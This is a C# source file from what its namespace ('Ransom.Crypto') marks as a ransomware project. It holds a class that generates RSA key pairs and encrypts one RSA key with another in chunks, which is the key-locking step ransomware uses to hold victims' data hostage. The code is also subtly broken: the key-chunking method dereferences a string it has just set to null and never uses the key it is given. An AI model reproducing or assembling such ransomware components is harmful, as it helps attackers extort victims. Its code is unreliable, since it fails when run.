using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace Ransom.Crypto
{
    class Asymmetric
    {
        private const int DEFAULT_RSA_KEY_SIZE = 4096;

        private RSACryptoServiceProvider? Rsa;

        public Asymmetric() { }

        /// <summary>
        /// Generating RSA keys.
        /// </summary>
        public (RSAParameters, RSAParameters) GenerateKeys(int keySize = DEFAULT_RSA_KEY_SIZE)
        {
            Rsa = new RSACryptoServiceProvider(keySize);
            return (Rsa.ExportParameters(false), Rsa.ExportParameters(true));
        }

        /// <summary>
        /// Encrypting data with an RSA public key.
        /// </summary>
        public static byte[]? String2RSA(string data, RSAParameters publicKey)
        {
            if (string.IsNullOrEmpty(data))
                return null;

            RSACryptoServiceProvider pubKey = new RSACryptoServiceProvider();
            pubKey.ImportParameters(publicKey);

            byte[] dataAsBytes = Encoding.UTF8.GetBytes(data);

            return pubKey.Encrypt(dataAsBytes, true);
        }

        public static List<byte[]> RSAKey2RSA(RSAParameters keyToEncrypt, RSAParameters publicKey)
        {
            List<byte[]> totalEncrypted = new List<byte[]>();
            string keyRepresentation = null;

            int n = 126, keyLength = keyRepresentation.Length;

            for (int i = 0; i < keyLength; i += n)
            {
                int last = 0;
                string concatString = string.Empty;

                try
                {
                    last = i;
                    concatString = keyRepresentation.Substring(i, n);
                }
                catch (ArgumentOutOfRangeException)
                {
                    if (last + n - keyLength > 0)
                        concatString = keyRepresentation[last..keyLength];
                }

                byte[]? encryptedKey = String2RSA(concatString, publicKey);
                if (encryptedKey != null)
                    totalEncrypted.Add(encryptedKey);

            }

            return totalEncrypted;
        }
    }
}
